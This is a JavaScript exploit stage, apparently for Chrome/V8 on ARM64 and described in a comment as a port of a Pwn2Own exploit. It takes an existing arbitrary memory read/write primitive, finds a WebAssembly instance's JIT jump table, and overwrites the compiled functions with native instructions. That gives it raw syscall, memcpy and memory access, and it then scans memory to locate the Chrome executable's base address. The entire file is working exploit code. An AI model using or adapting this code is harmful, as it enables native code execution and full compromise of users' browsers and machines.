import * as fs from "node:fs";
import { wasmstage2Native } from "./wasmstage2-native.mjs";
import { default as peekpoke } from "./peekpoke/index.js";

function callEverythingOnce(instance) {
  instance.exports.read64(0n);
  instance.exports.write64(0n, 0n);
  instance.exports.read32(0n);
  instance.exports.write32(0n, 0);
  instance.exports.read8(0n);
  instance.exports.write8(0n, 0);
  instance.exports.call64(0n, 0n, 0n, 0n, 0n, 0n, 0n);
  instance.exports.memcpy(0n, 0n, 0n);
  instance.exports.cacheflush(0n, 0n);
  instance.exports.icacheflush(0n, 0n);
  instance.exports.syscall(0n, 0n, 0n, 0n, 0n, 0n, 0n);
}

function overwriteFunctions(jumpTableAddress, arbRW) {
  for (let i = 0; i < wasmstage2Native.length; i++) {
    const branchInstructionAddr = jumpTableAddress + BigInt(i * 8 + 4);
    const branchInstruction = arbRW.read32(branchInstructionAddr);
    const branchOffset = ((branchInstruction << (32 - 26)) >> (32 - 26)) * 4;
    const functionStartAddr = branchInstructionAddr + BigInt(branchOffset);
    console.log(functionStartAddr.toString(16));
    overwriteFunction(functionStartAddr, wasmstage2Native[i], arbRW);
  }
  //%SystemBreak();
}

function overwriteFunction(functionStartAddr, instructions, arbRW) {
  for (let i = 0; i < instructions.length; i++) {
    arbRW.write32(functionStartAddr + BigInt(i * 4), instructions[i]);
  }
}

function getJumpTableAddress(wasmInstance, arbRW) {
  // port of _manfp's Pwn2Own exploit: https://crbug.com/330575498
  // Chrome 118 doesn't have a Trusted Table, so jump_table_start is actually in the heap.
  const jump_table_start_offset = 0x50n;
  const wasmInstanceAddr = arbRW.addrof(wasmInstance) & 0xffffffff_fffffffen;
  const jumpTableStart = arbRW.read64(wasmInstanceAddr + jump_table_start_offset);
  return jumpTableStart;
}

function initializeStage2(stage2ModuleBytes, arbRW) {
  const module = new WebAssembly.Module(stage2ModuleBytes);
  const instance = new WebAssembly.Instance(module);
  // run everything once to generate JIT code
  // node --print-code wasmstage2-node.mjs to confirm
  callEverythingOnce(instance);
  const jumpTableAddress = getJumpTableAddress(instance, arbRW);
  console.log(jumpTableAddress.toString(16));
  overwriteFunctions(jumpTableAddress, arbRW);
  return instance;
}

function accessibleMemory(address, arbRW) {
  const NR_mincore = 232n;
  const ENOMEM = 12n;
  const retval = arbRW.syscall(address, 0x1n, 0n, 0n, 0n, NR_mincore);
  return retval !== -ENOMEM;
}

function getChromeExecutableBase(wasmLR, arbRW) {
  const pageMask = 0x3fffn;
  const notPageMask = 0xffffffff_ffffffffn & ~pageMask;
  const startPage = wasmLR & notPageMask;
  const endPage = startPage - 0x8000000n;
  for (let i = wasmLR & notPageMask; i >= endPage; i -= 0x4000n) {
    if (!accessibleMemory(i, arbRW)) {
      continue;
    }
    const d = arbRW.read32(i);
    if (d === 0x464c457f) {
      // .ELF
      return i;
    }
  }
  return 0;
}

const module = fs.readFileSync("wasmstage2.wasm");
const arbRW = {
  addrof: peekpoke.addrof,
  read32: peekpoke.read32,
  write32: peekpoke.write32,
  read64: (a) => BigInt(peekpoke.read32(a)) | (BigInt(peekpoke.read32(a + 4n)) << 32n),
};

const instance = initializeStage2(module, arbRW);
const wasmLR = instance.exports.getLR();
console.log(wasmLR.toString(16));
const stage2ArbRW = {
  read32: instance.exports.read32,
  write32: instance.exports.write32,
  read64: (a) => BigInt(instance.exports.read32(a)) | (BigInt(instance.exports.read32(a + 4n)) << 32n),
  syscall: instance.exports.syscall,
  memcpy: instance.exports.memcpy,
  addrof: peekpoke.addrof, // no stage2 version of this yet...
};
const chromeBase = getChromeExecutableBase(wasmLR, stage2ArbRW);
console.log(chromeBase.toString(16));
